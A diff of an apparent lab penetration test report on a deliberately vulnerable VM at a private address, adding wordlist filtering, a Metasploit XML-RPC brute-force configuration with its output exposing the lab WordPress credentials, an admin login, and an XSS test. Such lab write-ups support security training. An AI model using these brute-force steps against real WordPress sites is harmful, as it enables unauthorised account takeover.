@@ -1,4 +1,4 @@
-﻿# Penetration Test Report Template
+﻿# Penetration Test Report
 ## Lab Penetration Test Report
 
 Version 1.0  
@@ -310,7 +310,24 @@ Blog found
     key-1-of-3.txt
 
 ### http://192.168.56.105/fsocity.dic  
-found dictionary
+This file is a dictionary  
+
+    ┌──(kali㉿kali)-[~]
+    └─$ wc -l /kali-share/downloads/fsocity.dic
+    858160 /kali-share/downloads/fsocity.dic
+
+Try to reduce the size of the dictionary
+  - https://fr.manpages.org/uniq
+
+
+    cat fsocity.dic | sort | uniq > fsociety_filtered.txt
+
+Result
+
+    ┌──(kali㉿kali)-[~]
+    └─$ wc -l fsociety_filtered.txt            
+    11451 fsociety_filtered.txt
+
 
 ### http://192.168.56.105/key-1-of-3.txt
 
@@ -356,6 +373,7 @@ Try fake hostname
 
   - Found `/wp-login.php` with nikto
   - Found `/fsocity.dic` in robots.txt
+    - Filtered dictionary create fsociety-filtered.txt
 
 ### Weaponisation
 
@@ -381,20 +399,46 @@ https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     use use auxiliary/scanner/http/wordpress_xmlrpc_login
     set RHOSTS 192.168.56.105
     set USERNAME Elliot
-    set PASS_FILE ~/fsocity.dic
+    set PASS_FILE ~/fsociety-filtered.txt
+
+Result
+
+    [+] 192.168.56.105:80 - Success: 'Elliot:ER28-0652'
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+    msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) >
+
 
 #### Loot
 
-| Type       | Information                                                            | Gathered                     |
-|------------|------------------------------------------------------------------------|------------------------------|
-| Credential | Wordpress username:<br/>  - `Elliot`<br/>  - `elliot`<br/>  - `ELLIOT` | Brute force on /wp-login.php |
+| Type       | Information                                                               | Gathered                     |
+|------------|---------------------------------------------------------------------------|------------------------------|
+| Credential | Wordpress:<br/>  - `Elliot`:`ER28-0652`<br/>  - `elliot`<br/>  - `ELLIOT` | Brute force on /wp-login.php |
 
 ### Exploit
+
+Login using:
+  - Username: `Elliot`
+  - Password: `ER28-0652`
+
+![WordPress administration](assets/2022-09-04 20_09_15-.png)
 
 ## Kill Chain – Phase 2
 
 ### Reconnaissance
-Sometimes, once you gain access to a host, you will want start from the reconnaissance stage again. In these cases, you can break up the report into Phase 1 and Phase 2.
+#### XSS
+Create page with a script, maybe we can create a reverse shell
+
+![XSS alert on created page](assets/2022-09-04_14-28.jpeg)
+
+Yes, we can
+
+#### WordPress Plugins
+![WordPress plugin list](assets/2022-09-04_14-20.jpeg)
+
+#### WordPress Users
+
+![WordPress users list](assets/2022-09-04_14-30.jpeg)
 
 ### Weaponisation
 ### Delivery
@@ -426,6 +470,6 @@ Sometimes, once you gain access to a host, you will want start from the reconnai
 # Maintaining Access
 On each host that was compromised, …
 # House Cleaning
-Once we had completely compromised a host, … 
+Once we had completely compromised a host, …
 # Appendices
 
